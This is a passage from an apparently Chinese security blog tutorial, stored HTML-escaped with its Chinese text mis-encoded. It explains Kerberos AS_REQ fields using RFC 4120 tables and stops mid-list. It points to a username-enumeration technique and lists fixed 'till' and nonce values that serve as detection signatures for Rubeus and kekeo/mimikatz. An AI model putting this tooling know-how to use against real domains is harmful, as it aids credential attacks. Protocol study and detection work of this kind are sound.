&lt;p&gt;è¿™é‡Œå°±å¼€å§‹åˆ°äº†kerberosçš„æ­¥éª¤äº†ï¼Œè¦æ³¨æ„çš„å°±æ˜¯Windowsä¸ä¼šæ˜æ–‡ä¿å­˜å¯†é’¥ï¼Œéƒ½æ˜¯é€šè¿‡NTLMæ¥è¿›è¡Œå­˜å‚¨çš„ã€‚å½“ç„¶æ•´ä¸ªè®¤è¯è¿‡ç¨‹ä¸ä¼šå¾ˆç®€å•ï¼Œæˆ‘ä»¬å…ˆè¦äº†è§£ä¸€äº›åŸºç¡€çš„æ¦‚å¿µï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;KDCï¼ˆKey Distribution Centerï¼‰= å¯†é’¥åˆ†å‘ä¸­å¿ƒ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ASï¼ˆAuthentication Serviceï¼‰= è®¤è¯ç”¨æˆ·çš„èº«ä»½ï¼Œå¹¶ä¸ºå…¶å‘æ”¾TGTçš„æœåŠ¡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TGTï¼ˆTicket Granting Ticketï¼‰= TGTè®¤è¯ç¥¨æ®ï¼Œç”±ASæœåŠ¡å‘æ”¾&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TGSï¼ˆTicket Granting Serviceï¼‰= ç¥¨æ®å‘æ”¾æœåŠ¡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;STï¼ˆService Ticketsï¼‰=  STæœåŠ¡ç¥¨æ®ï¼Œç”±TGSæœåŠ¡å‘é€&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;APï¼ˆApplication Serverï¼‰=  æä¾›ç”¨æˆ·æ‰€éœ€çš„æœåŠ¡&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;çœ‹ç€æ¦‚å¿µæŒºæ¨¡ç³Šçš„å¯¹å§ï¼Œè€Œä¸”ä¸Šé¢åˆ°äº†kerberosæ­¥éª¤äº†ï¼Œæ€ä¹ˆè¿˜ä¸ç»§ç»­ä¸‹å»ï¼Œåˆ«æ€¥ï¼Œæˆ‘ä»¬æ˜ç™½ASè®¤è¯æœåŠ¡å’ŒTGSè®¤è¯æœåŠ¡è¿™ä¸¤ä¸ªåˆ°åº•æ˜¯å•¥ï¼Œè·ŸKDCæœ‰ä»€ä¹ˆå…³è”ï¼Œé‚£KDCåˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;KDC&lt;/strong&gt;ï¼ˆKey Distribution Centerï¼‰ï¼šæ˜¯é»˜è®¤å®‰è£…åœ¨DCï¼ˆåŸŸæ§åˆ¶å™¨ï¼‰ä¸ŠKerberosçš„ä¸»è¦æœåŠ¡ï¼Œè´Ÿè´£å‘è¡Œç¥¨æ®ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„ä¸€å¼ å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ASè®¤è¯æœåŠ¡å’ŒTGSæœåŠ¡æ˜¯è¢«åŒ…å«åœ¨KDCä¸­çš„ï¼Œé‚£ASè®¤è¯æœåŠ¡å’ŒTGSæœåŠ¡åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢ä¸€å¼ å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä»å›¾ä¸­æˆ‘ä»¬å¾ˆæ¸…æ¥šå¯ä»¥çœ‹å‡ºASæœåŠ¡æ˜¯ç”¨æ¥éªŒè¯ç”¨æˆ·èº«ä»½çš„ï¼ŒTGSæœåŠ¡æ˜¯ç”¨æ¥éªŒè¯ç”¨æˆ·æ˜¯å¦å¯ä»¥è®¿é—®Win7çš„ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åŸŸç”¨æˆ·Luckyå‘kerberosæœåŠ¡è¯·æ±‚ï¼Œå¸Œæœ›è·å–ç™»å½•Win7çš„æƒé™ã€‚ kerberoså¾—åˆ°äº†è¿™ä¸ªæ¶ˆæ¯ï¼Œé¦–å…ˆå¾—åˆ¤æ–­Luckyæ˜¯å¦æ˜¯å¯ä¿¡èµ–çš„ï¼Œ ä¹Ÿå°±æ˜¯ç™½åå•é»‘åå•çš„è¯´æ³•ã€‚è¿™å°±æ˜¯ASæœåŠ¡å®Œæˆçš„å·¥ä½œï¼Œé€šè¿‡ åœ¨ADä¸­å­˜å‚¨é»‘åå•å’Œç™½åå•æ¥åŒºåˆ†Luckyã€‚æˆåŠŸåï¼Œè¿”å›ASè¿”å›TGTç¥¨æ®ç»™Luckyã€‚&lt;/li&gt;
&lt;li&gt;Luckyå¾—åˆ°äº†TGTç¥¨æ®åï¼Œç»§ç»­å‘kerberosè¯·æ±‚ï¼Œå¸Œæœ›è·å–ç™»å½•Win7çš„æƒé™ã€‚kerberosåˆå¾—åˆ°äº†è¿™ä¸ªæ¶ˆæ¯ï¼Œè¿™æ—¶å€™é€šè¿‡Luckyæ¶ˆæ¯ä¸­çš„TGTç¥¨æ®ï¼Œåˆ¤æ–­å‡ºäº†Luckyæ‹¥æœ‰äº†è¿™ä¸ªæƒé™ï¼Œç»™äº†Luckyç™»å½•Win7çš„æƒé™Service ticketã€‚&lt;/li&gt;
&lt;li&gt;Luckyå¾—åˆ°Service ticketåï¼Œç»ˆäºå¯ä»¥æˆåŠŸç™»å½•Win7ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å½“ç„¶ï¼Œè¿™ä¸ªService ticketåªæ˜¯ä»…ä»…ç™»å½•Win7ï¼ˆHostæœåŠ¡ï¼‰çš„ï¼Œå¦‚æœè¿˜éœ€è¦è®¿é—®å…¶ä»–çš„æœåŠ¡è¦å†æ¬¡å‘TGSç”³è¯·ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä¼šè¯¦ç»†è®²ä¸€ä¸‹ASå’ŒTGSçš„è®¤è¯è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;asè®¤è¯&#34;&gt;ASè®¤è¯&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬ä»ä¸Šé¢å¯çŸ¥ï¼ŒASè¿™ä¸€ä¸ªæ­¥éª¤æ˜¯ç”¨æ¥è¯†åˆ«ç”¨æˆ·ä¿¡æ¯çš„çœŸå®æ€§ï¼Œä¹Ÿæ˜¯ç”¨æˆ·ä»KDCæ‹¿åˆ°TGTç¥¨æ®çš„è¿‡ç¨‹ï¼Œå»ºè®®å¤§å®¶é€šè¿‡Wiresharkæ¥ä¸€èµ·å®è·µå­¦ä¹ ã€‚è¿™é‡Œæˆ‘ä¼šåˆ†ä¸ºä¸¤éƒ¨åˆ†æ¥è®²ï¼Œä¸€ä¸ªæ˜¯AS_REQï¼ˆå®¢æˆ·ç«¯è¯·æ±‚åŒ…ï¼‰ï¼Œä¸€ä¸ªæ˜¯AS_REPï¼ˆKDCå“åº”åŒ…ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;å¤§å®¶å¯¹ç…§æ¯ä¸€é¡¹è¿›è¡Œå­¦ä¹ çš„æ—¶å€™å¯ä»¥çœ‹ä¸‹&lt;a href=&#34;https://www.ietf.org/rfc/rfc4120.txt&#34;&gt;rfc4120&lt;/a&gt;,è¿™æ˜¯åè®®çš„è¯¦ç»†æ ‡å‡†ï¼Œä¸‹é¢å°±ä¸¾ä¾‹ä¸€éƒ¨åˆ†æ¥è®²ã€‚&lt;/p&gt;
&lt;h3 id=&#34;as_req&#34;&gt;AS_REQ&lt;/h3&gt;
&lt;p&gt;å…ˆæ¥çœ‹ä¸‹WiresharkæŠ“åˆ°çš„kerberosçš„åŒ…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;pvno&lt;/strong&gt;ï¼škerberosåè®®çš„ç‰ˆæœ¬å·&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;msg-type&lt;/strong&gt;ï¼šæ¶ˆæ¯ç±»å‹ï¼ŒAS_REQå›ºå®šä¸ºkrb-as-reqï¼Œå…·ä½“çš„ç±»å‹å’Œå€¼å¦‚ä¸‹è¡¨&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Message Type   Value  Meaning
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  KRB_AS_REQ     10      åˆå§‹è®¤è¯è¯·æ±‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  KRB_AS_REP     11      å“åº” KRB_AS_REQ è¯·æ±‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  KRB_TGS_REQ    12      åŸºäº TGT çš„è®¤è¯è¯·æ±‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  KRB_TGS_REP    13      å“åº” KRB_TGS_REQ è¯·æ±‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  KRB_AP_REQ     14      å¯¹æœåŠ¡å™¨çš„åº”ç”¨ç¨‹åºè¯·æ±‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  KRB_AP_REP     15      å¯¹ KRB_AP_REQ_MUTUAL çš„å“åº”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  KRB_RESERVED16 16      ä¸ºç”¨æˆ·åˆ°ç”¨æˆ·ä¿ç•™ krb_tgt_request
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  KRB_RESERVED17 17      ä¸ºç”¨æˆ·å¯¹ç”¨æˆ·ä¿ç•™ krb_tgt_reply
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  KRB_SAFE       20      å®‰å…¨ï¼ˆæ ¡éªŒå’Œï¼‰åº”ç”¨ç¨‹åºæ¶ˆæ¯
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  KRB_PRIV       21      ç§æœ‰ï¼ˆåŠ å¯†ï¼‰åº”ç”¨ç¨‹åºæ¶ˆæ¯
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  KRB_CRED       22      è¦è½¬å‘çš„ç§æœ‰ï¼ˆåŠ å¯†ï¼‰æ¶ˆæ¯è¯ä¹¦
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  KRB_ERROR      30      é”™è¯¯å“åº”
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;padata&lt;/strong&gt;ï¼šPA_DATAä¸»è¦æ˜¯ä¸€äº›è®¤è¯ä¿¡æ¯ï¼Œä¸€ä¸ªåˆ—è¡¨ï¼ŒåŒ…å«è‹¥å¹²ä¸ªè®¤è¯æ¶ˆæ¯ç”¨äºè®¤è¯ï¼Œæ¯ä¸ªè®¤è¯æ¶ˆæ¯æœ‰padata_typeå’Œvalueã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;7.5.2.  PreAuthentication Data Types
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Padata and Data Type    Padata-type   Comment
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                            Value
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-TGS-REQ                  1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-ENC-TIMESTAMP            2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-PW-SALT                  3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   [reserved]                  4
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-ENC-UNIX-TIME            5        (deprecated)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-SANDIA-SECUREID          6
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-SESAME                   7
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-OSF-DCE                  8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-CYBERSAFE-SECUREID       9
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-AFS3-SALT                10
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-ETYPE-INFO               11
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-SAM-CHALLENGE            12       (sam/otp)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-SAM-RESPONSE             13       (sam/otp)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-PK-AS-REQ_OLD            14       (pkinit)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-PK-AS-REP_OLD            15       (pkinit)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-PK-AS-REQ                16       (pkinit)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-PK-AS-REP                17       (pkinit)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-ETYPE-INFO2              19       (replaces pa-etype-info)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-USE-SPECIFIED-KVNO       20
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-SAM-REDIRECT             21       (sam/otp)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-GET-FROM-TYPED-DATA      22       (embedded in typed data)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   TD-PADATA                   22       (embeds padata)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-SAM-ETYPE-INFO           23       (sam/otp)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-ALT-PRINC                24       (crawdad@fnal.gov)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-SAM-CHALLENGE2           30       (kenh@pobox.com)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-SAM-RESPONSE2            31       (kenh@pobox.com)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-EXTRA-TGT                41       Reserved extra TGT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   TD-PKINIT-CMS-CERTIFICATES  101      CertificateSet from CMS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   TD-KRB-PRINCIPAL            102      PrincipalName
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   TD-KRB-REALM                103      Realm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   TD-TRUSTED-CERTIFIERS       104      from PKINIT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   TD-CERTIFICATE-INDEX        105      from PKINIT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   TD-APP-DEFINED-ERROR        106      application specific
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   TD-REQ-NONCE                107      INTEGER
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   TD-REQ-SEQ                  108      INTEGER
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-PAC-REQUEST              128      (jbrezak@exchange.microsoft.com)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™é‡Œè¡¨ç¤ºpre-authentication data é¢„è®¤è¯æ•°æ®ï¼Œæœ‰ä¸¤é¡¹åˆ†åˆ«æ˜¯&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;pA-ENC-TIMESTAMPï¼šæŒ‰ç…§etypeçš„åŠ å¯†ç±»å‹ï¼Œç”¨ç”¨æˆ·hashåŠ å¯†æ—¶é—´æˆ³ï¼Œä½œä¸ºvalue å‘é€ç»™ASæœåŠ¡å™¨ã€‚ç„¶åASæœåŠ¡å™¨é‚£è¾¹æœ‰ç”¨æˆ·hashï¼Œä½¿ç”¨ç”¨æˆ·hashè¿›è¡Œè§£å¯†ï¼Œè·å¾—æ—¶é—´æˆ³ï¼Œå¦‚æœèƒ½è§£å¯†ï¼Œä¸”æ—¶é—´æˆ³åœ¨ä¸€å®šçš„èŒƒå›´å†…ï¼Œåˆ™è¯æ˜è®¤è¯é€šè¿‡è¿”å› TGTç¥¨æ®å’Œenc_partï¼ˆé‡Œé¢åŒ…å«æœ‰session-keyï¼‰ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PA-DATA pA-PAC-REQUESTï¼šè¿™ä¸ªæ˜¯å¯ç”¨PACæ”¯æŒçš„æ‰©å±•ã€‚PAC(Privilege Attribute Certificate)å¹¶ä¸åœ¨åŸç”Ÿçš„kerberosé‡Œé¢ï¼Œæ˜¯å¾®è½¯å¼•è¿›çš„æ‰©å±•ã€‚æ‰€ä»¥æˆ‘ä»¬è¦æ¸…æ¥škerberosä¸æ˜¯Windowsä¸Šæ‰æœ‰çš„ï¼ŒLinuxä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªåè®®åšè®¤è¯ã€‚PACåŒ…å«åœ¨ASREQçš„å“åº”body(ASREP)ã€‚è¿™é‡Œçš„valueå¯¹åº”çš„æ˜¯include=trueæˆ–è€…include=false(KDCæ ¹æ®includeçš„å€¼æ¥åˆ¤æ–­è¿”å›çš„ç¥¨æ®ä¸­æ˜¯å¦æºå¸¦PAC)ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;kdc-options&lt;/strong&gt;ï¼šè®¾ç½®ä¸€äº›æ ‡å¿—ä¿¡æ¯å¯ä»¥ä¿®æ”¹KDCçš„è¡Œä¸ºï¼Œåœ¨å®˜æ–¹è§£é‡Šæ˜¯&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This field appears in the KRB_AS_REQ and KRB_TGS_REQ requests to the KDC and indicates the flags that the client wants set on the tickets as well as other information that is to modify the behavior of the KDC.  Where appropriate, the name of an option may be the same as the flag that is set by that option.  Although in most cases, the bit in the options field will be the same as that in the flags field, this is not guaranteed&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;cname&lt;/strong&gt;ï¼šè¿™æ˜¯ç”¨æˆ·åï¼Œé‡‡ç”¨çš„æ˜¯PrincipalName ç±»å‹å’Œstringç±»å‹çš„ç»„åˆã€‚snameä¹Ÿæ˜¯é‡‡ç”¨è¿™ç§æ ¼å¼ï¼Œä¸»è¦çš„ç±»å‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  7.5.8.  Name Types
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     Name Type           Value  Meaning
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     KRB_NT_UNKNOWN        0    æœªçŸ¥åç§°ç±»å‹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     KRB_NT_PRINCIPAL      1    ç”¨æˆ·ä¸»ä½“åç§°ç±»å‹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     KRB_NT_SRV_INST       2    æœåŠ¡å’Œå…¶ä»–å”¯ä¸€å®ä¾‹(krbtgt)çš„åç§°ç±»å‹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     KRB_NT_SRV_HST        3    æœåŠ¡ä¸»æœºåç§°ä¸ºå®ä¾‹åçš„åç§°ç±»å‹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     KRB_NT_SRV_XHST       4    æœåŠ¡ä¸ä¸»æœºä½œä¸ºå‰©ä½™ç»„ä»¶åç§°ç±»å‹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     KRB_NT_UID            5    å”¯ä¸€IDåç§°ç±»å‹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     KRB_NT_X500_PRINCIPAL 6    X.509ç¼–ç çš„å¯åˆ†è¾¨åç§°ç±»å‹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     KRB_NT_SMTP_NAME      7    é‚®ä»¶åç§°ç±»å‹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     KRB_NT_ENTERPRISE    10    ä¼ä¸šåç§°ç±»å‹
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™é‡Œå­˜åœ¨ä¸€ä¸ªç”¨æˆ·åæšä¸¾çš„æ–¹æ³•ï¼Œå¯ä»¥çœ‹å¦å¤–ä¸€ç¯‡æ–‡ç« &lt;a href=&#34;https://xxe.icu/posts/kerberos_user_enumerate/&#34;&gt;åŸŸæ¸—é€-ç”¨æˆ·åæšä¸¾&lt;/a&gt;å¯¹ç…§å­¦ä¹ ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;realm&lt;/strong&gt;ï¼šæœåŠ¡ç«¯åŸŸå&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;sname&lt;/strong&gt;ï¼šå…³è”çš„æœåŠ¡SPNï¼Œåœ¨ASREQé‡Œé¢æ˜¯krbtgtå’ŒåŸŸåï¼Œç±»å‹æ˜¯KRBNTSRVINST&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;till&lt;/strong&gt;ï¼šæ­¤å­—æ®µåŒ…å«å®¢æˆ·ç«¯è¯·æ±‚ç¥¨è¯çš„åˆ°æœŸæ—¶é—´ï¼Œrubeuså’Œkekeoéƒ½æ˜¯20370913024805Zï¼Œè¿™ä¸ªå¯ä»¥ä½œä¸º&lt;code&gt;ç‰¹å¾&lt;/code&gt;æ¥æ£€æµ‹å·¥å…·ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;rtime&lt;/strong&gt;ï¼šå¦‚æœæ˜¯ä¸€ä¸ªå¯æ›´æ–°ç¥¨æ®çš„è¦æ±‚ï¼Œè¿™ä¸ªå­—æ®µæ˜¯ä¸€ä¸ªç»å¯¹åˆ°æœŸçš„æ—¶é—´&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;nonce&lt;/strong&gt;ï¼šéšæœºæ•°ï¼Œç”¨æ¥é˜²æ­¢æ•°æ®åŒ…é‡æ”¾ã€‚éšæœºç”Ÿæˆçš„ä¸€ä¸ªæ•°kekeo/mimikatz nonceæ˜¯12381973ï¼Œrubeus nonceæ˜¯1818848256ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥ç”¨æ¥ä½œä¸º&lt;code&gt;ç‰¹å¾&lt;/code&gt;æ£€æµ‹å·¥å…·ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;etype&lt;/strong&gt;ï¼šåŠ å¯†ç±»å‹,åœ¨è¯·æ±‚æŠ¥æ–‡ä¹‹ä¸­æ¯ä¸ªæœ‰åŠ å¯†çš„æ•°æ®éƒ½æœ‰ä¸€ä¸ªetypeå­—æ®µå¯¹åº”,KDCå°±æ˜¯ä»è¿™æ®µæ•°æ®ä¸­åŠ å¯†æ–¹å¼,æ¥ä»ADä¹‹ä¸­é€‰æ‹©å¯¹åº”çš„hashæ¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;des_cbc_crc = 1,
des_cbc_md4 = 2,
des_cbc_md5 = 3,
des3_cbc_md5 = 5,
des3_cbc_sha1 = 7,
dsaWithSHA1_CmsOID = 9,
md5WithRSAEncryption_CmsOID = 10,
sha1WithRSAEncryption_CmsOID = 11,
rc2CBC_EnvOID = 12,
rsaEncryption_EnvOID = 13,
